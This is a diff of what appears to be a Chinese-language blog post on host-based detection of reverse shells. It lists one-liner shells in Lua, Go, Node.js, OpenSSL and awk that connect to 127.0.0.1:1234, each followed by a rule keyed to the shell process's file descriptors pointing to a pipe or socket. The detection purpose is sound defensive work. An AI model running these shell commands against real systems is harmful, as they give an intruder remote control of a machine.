@@ -178,8 +178,8 @@ rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG62.jpeg"/>
 <img alt="agent" class="img-fluid" src="../images/WechatIMG63.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
-<p>创建了bash进程，0和1描述符都指向了pipe，这两个pipe关联到文件和nc上。</p>
-<p>匹配规则：bash进程的0，和1文件描述符指向pipe</p>
+<p>创建了sh进程，0和1描述符都指向了pipe，这两个pipe关联到文件和nc上。</p>
+<p>匹配规则：sh进程的0，和1文件描述符指向pipe</p>
 <div class="highlight"><pre><span></span><span class="n">lua</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
@@ -192,10 +192,15 @@ rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f
 <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG56.jpeg"/></p>
+<p>目标机执行后的结果如下：</p>
+<p>匹配规则：某一个bash进程的0 文件描述符指向socket</p>
 <p>Golang</p>
 <div class="highlight"><pre><span></span><span class="nt">echo</span> <span class="s1">'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1234");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">t</span><span class="p">.</span><span class="nc">go</span> <span class="o">&amp;&amp;</span> <span class="nt">go</span> <span class="nt">run</span> <span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">t</span><span class="p">.</span><span class="nc">go</span> <span class="o">&amp;&amp;</span> <span class="nt">rm</span> <span class="o">/</span><span class="nt">tmp</span><span class="o">/</span><span class="nt">t</span><span class="p">.</span><span class="nc">go</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG64.jpeg"/></p>
+<p>目标机执行后的结果如下：</p>
+<p>创建了bash进程，0和1描述符都指向了pipe。
+匹配规则：bash进程的0，和1文件描述符指向pipe</p>
 <p>Nodejs</p>
 <div class="highlight"><pre><span></span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
     <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"net"</span><span class="p">),</span>
@@ -235,8 +240,8 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port2&gt; <span 
 <div class="highlight"><pre><span></span>openssl s_client -quiet -connect <span class="m">127</span>.0.0.1:1234<span class="p">|</span>/bin/bash<span class="p">|</span>openssl s_client -quiet -connect <span class="m">127</span>.0.0.1:12345
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WeChat8872f342986ad270beb9f2cfed15620b.png"/>目标机执行后的结果如下：</p>
-<p>创建了一个常住进程“bash”， 它的得0和1文件描述符都指向socket。</p>
-<p>匹配规则：bash进程的0，和1文件描述符指向socket</p>
+<p>创建了bash进程，0和1描述符都指向了pipe。
+匹配规则：bash进程的0，和1文件描述符指向pipe</p>
 <div class="highlight"><pre><span></span>awk <span class="s1">'BEGIN {s = "/inet/tcp/0/127.0.0.1/1234"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}'</span> /dev/null
 </pre></div>
 <p>无明显文件句柄特征</p>
